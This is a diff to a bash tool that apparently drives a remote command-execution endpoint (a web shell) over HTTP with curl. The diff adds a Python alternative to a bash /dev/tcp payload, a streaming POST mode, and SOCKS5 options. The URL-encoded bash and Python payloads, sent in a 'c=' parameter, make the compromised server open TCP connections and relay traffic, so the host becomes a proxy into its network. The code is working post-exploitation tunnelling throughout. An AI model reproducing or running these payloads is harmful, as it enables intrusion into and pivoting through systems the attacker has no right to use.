@@ -119,6 +119,7 @@ available_args=(
     "--attach"
     "--stream"
     "--socks5-bash"
+    "--socks5-python"
     "--socks5-path"
     "--socks5-port"
 )
@@ -328,6 +329,15 @@ while [ "$#" -gt 0 ]; do
                 update_config "SOCKS5_BIN_PATH" "bash"
             fi
             ;;
+        "--socks5-python")
+            update_config "SOCKS5_TYPE" "python"
+            if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]]; then
+                shift 
+                update_config "SOCKS5_BIN_PATH" "$1"
+            else
+                update_config "SOCKS5_BIN_PATH" "python"
+            fi
+            ;;
         "--socks5-path")
             if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]]; then
                 shift 
@@ -469,11 +479,11 @@ setup_shell() {
 
 
 keep_alive() {
+    local stream_keep_alive=$(get_config_value "STREAM_KEEP_ALIVE")
     while true; do
         current_time=$(date +%s)
         local start_time=$(cat $request_time 2>/dev/null) 
         local elapsed_time=$((current_time - start_time))
-        local $stream_keep_alive=$(get_config_alive "STREAM_KEEP_ALIVE")
         if [ "$elapsed_time" -ge "$stream_keep_alive" ]; then
             printf "%s" "%1b%1c" > $FIFO_PATH
             date +%s > $request_time
@@ -580,14 +590,15 @@ socks5_server () {
         local socks5_path="$(get_config_value "SOCKS5_PATH")"
         CURL_ARGS=()
         eval "CURL_ARGS=($(get_config_value "CURL_ARGS"))" 2>/dev/null
+        local stream="$(get_config_value "STREAM")"
         pid=$$
         pid_curl=""
         pid_while=""
         stdi="${socks5_path%/}/.$(cat /dev/urandom 2>/dev/null | LC_CTYPE=C tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 6)"
         stdo="${socks5_path%/}/.$(cat /dev/urandom 2>/dev/null | LC_CTYPE=C tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 6)"
         pi="/dev/shm/.s5i_$$"
-        exit_string="$(cat /dev/urandom 2>/dev/null | LC_CTYPE=C tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 20)"  #"9762awqGgreTh7231Asa"
-        connect_string="$(cat /dev/urandom 2>/dev/null | LC_CTYPE=C tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 20)"  #"c0Nnect_ahsgi8a13Kga"
+        exit_string="$(cat /dev/urandom 2>/dev/null | LC_CTYPE=C tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 20)"
+        connect_string="$(cat /dev/urandom 2>/dev/null | LC_CTYPE=C tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 20)"
         mkfifo "$pi"
         exec 4<>"$pi"
                     
@@ -597,31 +608,23 @@ socks5_server () {
         lcurl "i=$exit_string&fi=$stdi"
         if [[ -n "$pid_curl" ]]; then
             pstree -A -p $pid_curl | grep -Eow "[0-9]+" |  xargs kill -15 2>/dev/null
-            echo "curl 15" >> /dev/shm/kills
         fi
 
         if [[ -n "$pid_while" ]]; then
             pstree -A -p $pid_while | grep -Eow "[0-9]+" | xargs kill -15 2>/dev/null
-            echo "while 15" >> /dev/shm/kills
         fi
         pstree -A -p $$ | grep -Eow "[0-9]+" | grep -v $$ | xargs kill -15 2>/dev/null
-            echo "self 15" >> /dev/shm/kills
         sleep 3
         if [[ -n "$pid_curl" ]]; then
             pstree -A -p $pid_curl | grep -Eow "[0-9]+" | xargs kill -9 2>/dev/null
-            echo "curl 9" >> /dev/shm/kills
         fi
         if [[ -n "$pid_while" ]]; then
             pstree -A -p $pid_while | grep -Eow "[0-9]+" | xargs kill -9 2>/dev/null
-            echo "while 9" >> /dev/shm/kills
         fi
         pstree -A -p $$ | grep -Eow "[0-9]+" | grep -v $$ | xargs kill -9 2>/dev/null
-            echo "self 9" >> /dev/shm/kills
         pstree -A -p $pid | grep -Eow "[0-9]+" | grep -v $pid | xargs kill -15 2>/dev/null
-            echo "parretn 15" >> /dev/shm/kills
         sleep 1
         pstree -A -p $pid | grep -Eow "[0-9]+" | grep -v $pid | xargs kill -9 2>/dev/null
-        echo "parretn 9" >> /dev/shm/kills
         kill -15 $pid 2>/dev/null
         kill -9 $pid 2>/dev/null
         pstree -A -p $pid | grep -Eow "[0-9]+" | xargs kill -9 2>/dev/null
@@ -637,6 +640,17 @@ socks5_server () {
                 timeout $CURL_MAXTIME curl -s $URL?$1 "${CURL_ARGS[@]}" 2>1 >/dev/null
             fi
         }
+
+
+        send_data_stream () {
+            local stdi="$1"
+            local URL="$(get_config_value "URL")" 
+            local CURL_ARGS=()
+            local stream_keep_alive=$(get_config_value "STREAM_KEEP_ALIVE")
+            eval "CURL_ARGS=($(get_config_value "CURL_ARGS"))" 2>/dev/null
+            { { start_time=$(date +%s); while true; do current_time=$(date +%s); local elapsed_time=$((current_time - start_time)); if ! [[ -p "$pi" ]]; then break; fi; if [ "$elapsed_time" -ge "$stream_keep_alive" ]; then printf "%s" "%1b%1c"; start_time=$(date +%s); continue; fi; sleep 1; done; exit_thread 1; } & cat; } | curl -s -N -X POST $URL"?s=$stdi" "${CURL_ARGS[@]}" -T - 
+        }
+
 
         send_data_requests () {
             local stdi=$1
@@ -659,8 +673,16 @@ socks5_server () {
             local stdo="$4"
             local exit_string="$5"
             local connect_string="$6"
+            local socks5_type="$(get_config_value "SOCKS5_TYPE")"
+            local socks5_bin_path="$(get_config_value "SOCKS5_BIN_PATH")"
 
-            line="bash+-c+%22%7B+rm+-f+$stdi+$stdo%3B+mkfifo+$stdi+$stdo%3B+exec+4%3C%3E$stdi%3B+exec+5%3C%3E$stdo%3B+exec+3%3C%3E%2Fdev%2Ftcp%2F$ip%2F$port+%26%26+printf+%5C%22%25s%5C%22+%5C%22$connect_string%5C%22+%3E+$stdo+%7C%7C+%7B+printf+%5C%22%25s%5C%22+%5C%22$exit_string%5C%22+%3E+$stdo%3B+sleep+2%3B+rm+-f+$stdi+$stdo%3B+exit%3B+%7D+%3B+cat+%3C%263+%3E$stdo+%26+pid_child%3D%5C%24%21%3B+trap+%27echo+pid%3D%5C%24pid_child%3B+kill+-9+%5C%24pid_child%3B+printf+%5C%22%25s%5C%22+%5C%22$exit_string%5C%22+%3E+$stdo%3B+sleep+2%3B+rm+-f+$stdi+$stdo%3B+kill+-9+%5C%24%5C%24%27+EXIT%3B+while+true%3B+do+IFS%3D+read+-t+0.1+-rd+%27%27+data%3C$stdi%3B+if+%5B+-n+%5C%22%5C%24data%5C%22+%5D%3B+then+if+%5B+%5C%22%5C%24data%5C%22+%3D+%5C%22$exit_string%5C%22+%5D%3B+then+echo+%27exit%27%3B+exit%3B+else+printf+%5C%22%25s%5C%22+%5C%22%5C%24data%5C%22+%3E%263%3B+fi%3B+else+if+%21+kill+-0+%5C%24pid_child+2%3E%2Fdev%2Fnull%3B+then+exit%3B+fi%3B+fi%3B+done%3B+%7D+2%3E%2Fdev%2Fnull%22"
+            if [[ "$socks5_type" == "bash" ]]; then
+                line="$socks5_bin_path+-c+%22%7B+rm+-f+$stdi+$stdo%3B+mkfifo+$stdi+$stdo%3B+exec+4%3C%3E$stdi%3B+exec+5%3C%3E$stdo%3B+exec+3%3C%3E%2Fdev%2Ftcp%2F$ip%2F$port+%26%26+printf+%5C%22%25s%5C%22+%5C%22$connect_string%5C%22+%3E+$stdo+%7C%7C+%7B+printf+%5C%22%25s%5C%22+%5C%22$exit_string%5C%22+%3E+$stdo%3B+sleep+2%3B+rm+-f+$stdi+$stdo%3B+exit%3B+%7D+%3B+cat+%3C%263+%3E$stdo+%26+pid_child%3D%5C%24%21%3B+trap+%27echo+pid%3D%5C%24pid_child%3B+kill+-9+%5C%24pid_child%3B+printf+%5C%22%25s%5C%22+%5C%22$exit_string%5C%22+%3E+$stdo%3B+sleep+2%3B+rm+-f+$stdi+$stdo%3B+kill+-9+%5C%24%5C%24%27+EXIT%3B+while+true%3B+do+IFS%3D+read+-t+0.1+-rd+%27%27+data%3C$stdi%3B+if+%5B+-n+%5C%22%5C%24data%5C%22+%5D%3B+then+if+%5B+%5C%22%5C%24data%5C%22+%3D+%5C%22$exit_string%5C%22+%5D%3B+then+echo+%27exit%27%3B+exit%3B+else+printf+%5C%22%25s%5C%22+%5C%22%5C%24data%5C%22+%3E%263%3B+fi%3B+else+if+%21+kill+-0+%5C%24pid_child+2%3E%2Fdev%2Fnull%3B+then+exit%3B+fi%3B+fi%3B+done%3B+%7D+2%3E%2Fdev%2Fnull%22"
+            elif [[ "$socks5_type" == "python" ]]; then
+                line="rm+-f+$stdi+$stdo%3B+mkfifo+$stdi+$stdo%3B+exec+3%3C%3E$stdi%3B+exec+4%3C%3E$stdo%3B+echo+%22import+socket%5Cnimport+fcntl%5Cnimport+os%5Cn%5Cno+%3D+open%28%27$stdo%27%2C+%27w%27%29%5Cni+%3D+open%28%27$stdi%27%2C+%27r%27%29%5Cnflags+%3D+fcntl.fcntl%28i%2C+fcntl.F_GETFL%29%5Cnfcntl.fcntl%28i%2C+fcntl.F_SETFL%2C+flags+%7C+os.O_NONBLOCK%29%5Cns+%3D+socket.socket%28socket.AF_INET%2C+socket.SOCK_STREAM%29%5Cn%5Cntry%3A%5Cn++++s.connect%28%28%27$ip%27%2C+$port%29%29%5Cn++++s.settimeout%280.1%29%5Cn++++o.write%28%27$connect_string%27%29%5Cn++++o.flush%28%29%5Cn++++while+True%3A%5Cn++++++++try%3A%5Cn++++++++++++try%3A%5Cn++++++++++++++++d+%3D+os.read%28i.fileno%28%29%2C+4096%29%5Cn++++++++++++++++if+d+is+None%3A%5Cn++++++++++++++++++++d+%3D+b%27%27%5Cn++++++++++++except+BlockingIOError%3A%5Cn++++++++++++++++d+%3D+b%27%27%5Cn++++++++++++if+%27$exit_string%27+in+d.decode%28%27utf-8%27%29%3A%5Cn++++++++++++++++break%5Cn++++++++++++try%3A%5Cn++++++++++++++++s.send%28d%29%5Cn++++++++++++++++rd+%3D+s.recv%284096%29%5Cn++++++++++++++++if+not+rd%3A%5Cn++++++++++++++++++++break%5Cn++++++++++++++++o.write%28rd.decode%28%27utf-8%27%29%29%5Cn++++++++++++++++o.flush%28%29%5Cn++++++++++++except+socket.timeout%3A%5Cn++++++++++++++++pass%5Cn++++++++except+socket.timeout%3A%5Cn++++++++++++pass++%5Cnexcept%3A%5Cn++++pass%5Cnfinally%3A%5Cn++++o.write%28%27$exit_string%27%29%5Cn++++o.close%28%29%5Cn++++i.close%28%29%5Cn++++s.close%28%29%22+%7C+$socks5_bin_path%3B+sleep+2%3Brm+-f+$stdi+$stdo"
+            else
+                exit_thread "1"
+            fi
             res=""
             if [[ " ${CURL_ARGS[@]} " =~ "-X POST" ]]; then
                 res=$(timeout 10 curl -s $URL "${CURL_ARGS[@]}" --data "c=$line")
@@ -735,14 +757,14 @@ socks5_server () {
 
                     connect "$ip" "$port" "$stdi" "$stdo" "$exit_string" "$connect_string" &
                     sleep 0.5
-                    (curl -s -N --retry 10 --retry-connrefused --retry-delay 1 "$URL?o=$stdo" "${CURL_ARGS[@]}" | tee "$pi" | dd bs=1024 skip=20 2>/dev/null) &
+                    (curl -s -N --retry 10 --retry-connrefused --retry-delay 1 "$URL?o=$stdo" "${CURL_ARGS[@]}" | tee "$pi" | dd bs=1 skip=20 status=none 2>/dev/null) & 
                     pid_curl=$!
 
                     check_connection="false"
                     str=""
                     (while true; do
                         chart=$(timeout 0.5 cat "$pi" 2>/dev/null);
-                       str+="$chart"
+                        str+="$chart"
                             
                         if [[ "$str" == *"$exit_string"* ]]; then
 
@@ -762,7 +784,11 @@ socks5_server () {
                         fi 
                     done; exit_thread "1") &
                     pid_while=$!
-                    send_data_requests "$stdi" 
+                    if [[ "$stream" == "yes" ]]; then
+                        send_data_stream "$stdi"           
+                    else
+                        send_data_requests "$stdi" 
+                    fi
                 fi
             fi
         fi
@@ -816,5 +842,9 @@ main () {
 
 
 main
+
+
+
+
 
 
